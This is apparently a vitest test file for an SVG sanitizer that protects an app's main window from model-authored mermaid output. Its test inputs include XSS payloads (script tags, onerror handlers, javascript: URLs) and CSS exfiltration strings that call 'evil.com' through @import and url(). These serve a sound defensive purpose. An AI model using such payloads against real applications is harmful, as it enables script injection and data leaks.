// Tests for the SVG sanitization policy used before mermaid output (or any
// other model-authored SVG/HTML) is injected via dangerouslySetInnerHTML in
// the main window. The policy must strip active content while preserving the
// diagram markup mermaid actually emits (incl. <foreignObject> htmlLabels).
import { describe, it, expect } from "vitest";
import { sanitizeSvg } from "../lib/sanitize";

describe("sanitizeSvg", () => {
  it("strips script elements inside SVG", () => {
    const out = sanitizeSvg(
      `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="10" height="10"/></svg>`,
    );
    expect(out).not.toContain("<script");
    expect(out).toContain("<rect");
  });

  it("strips inline event handlers", () => {
    const out = sanitizeSvg(
      `<svg><image href="x" onerror="alert(1)"/><text onclick="alert(2)">hi</text></svg>`,
    );
    expect(out).not.toMatch(/on(error|click)=/i);
    expect(out).toContain("hi");
  });

  it("strips javascript: URLs in href and xlink:href", () => {
    const out = sanitizeSvg(
      `<svg><a href="javascript:alert(1)"><text>click</text></a></svg>`,
    );
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("keeps foreignObject htmlLabels (mermaid multi-line labels) but sanitizes their content", () => {
    const dirty =
      `<svg><foreignObject width="100" height="50">` +
      `<div xmlns="http://www.w3.org/1999/xhtml">line1<br/>line2` +
      `<img src="x" onerror="alert(1)"/></div></foreignObject></svg>`;
    const out = sanitizeSvg(dirty);
    expect(out.toLowerCase()).toContain("foreignobject");
    expect(out).toContain("line1");
    expect(out).toContain("<br");
    expect(out).not.toMatch(/onerror=/i);
  });

  it("preserves core presentation attributes mermaid relies on", () => {
    const svg =
      `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">` +
      `<style>.lbl { fill: red; }</style>` +
      `<g transform="translate(1,2)"><path d="M0 0 L10 10" stroke="#000" fill="none" ` +
      `marker-end="url(#arrow)" text-anchor="middle" stroke-dasharray="3 3"/></g></svg>`;
    const out = sanitizeSvg(svg);
    expect(out).toContain("viewBox=");
    expect(out).toContain("<style");
    expect(out).toContain("transform=");
    expect(out).toContain("marker-end=");
    expect(out).toContain("stroke-dasharray=");
    expect(out).toContain("text-anchor=");
  });

  it("returns empty string for empty input", () => {
    expect(sanitizeSvg("")).toBe("");
    expect(sanitizeSvg(null)).toBe("");
    expect(sanitizeSvg(undefined)).toBe("");
  });

  // ---- Main-document CSS containment (audit #13) ----
  //
  // A <style> inside an SVG applies to the WHOLE document, and this sink is
  // the privileged main window — model CSS must not reach the app's real
  // stylesheet.

  it("neutralizes @import, remote url(), and position:fixed inside <style>", () => {
    const svg =
      `<svg><style>.evil { @import url("https://evil.com/x.css"); ` +
      `background: url(https://evil.com/?leak); position: fixed; inset: 0; } ` +
      `.ok { fill: blue; }</style><rect width="5" height="5"/></svg>`;
    const out = sanitizeSvg(svg);
    // The @import at-rule is replaced by an inert CSS comment.
    expect(out).toContain("/* removed: @import */");
    expect(out).not.toMatch(/@import\s+url/i);
    // (?<![-\w]) so the mangled "refused-url(" tail doesn't count as url(.
    expect(out).not.toMatch(/(?<![-\w])url\(\s*['"]?\s*https/i);
    expect(out).toMatch(/refused-url\(/);
    expect(out).not.toMatch(/(?<![-\w"'])position\s*:\s*fixed/i);
    expect(out).toMatch(/refused-position/);
    // Legitimate rules in the same style block survive.
    expect(out).toContain("fill: blue");
    // The <style> element itself is kept (mermaid needs it for theming).
    expect(out).toContain("<style");
  });

  it("keeps fragment url() references (mermaid markers/filters)", () => {
    const svg =
      `<svg><style>.arrow { filter: url(#glow); clip-path: url('#clip'); }</style>` +
      `<path marker-end="url(#arrow)" d="M0 0 L1 1"/></svg>`;
    const out = sanitizeSvg(svg);
    expect(out).toContain("url(#glow)");
    expect(out).toContain("url('#clip')");
    expect(out).toContain('marker-end="url(#arrow)"');
  });

  it("neutralizes dangerous CSS in inline style attributes", () => {
    const svg =
      `<svg><rect style="fill: url(https://evil.com/?leak); position: absolute" width="5" height="5"/>` +
      `<text style="font-size: 12px">keep me</text></svg>`;
    const out = sanitizeSvg(svg);
    expect(out).not.toMatch(/(?<![-\w])url\(\s*['"]?\s*https/i);
    expect(out).toMatch(/refused-url\(/);
    expect(out).not.toMatch(/(?<![-\w"'])position\s*:\s*absolute/i);
    expect(out).toMatch(/refused-position/);
    // Benign inline styles survive.
    expect(out).toContain("font-size: 12px");
  });

  it("keeps benign themeCSS flowing through mermaid's init directive", () => {
    // themeCSS is the documented mermaid escape hatch into <style>; benign
    // declarations must not be mangled by the containment pass.
    const svg =
      `<svg><style>.node rect { fill: #ececff; stroke: #9370db; stroke-width: 1px; } ` +
      `.lbl { font-family: "trebuchet ms", verdana; }</style></svg>`;
    const out = sanitizeSvg(svg);
    expect(out).toContain("fill: #ececff");
    expect(out).toContain("stroke: #9370db");
    expect(out).toContain("font-family");
  });
});
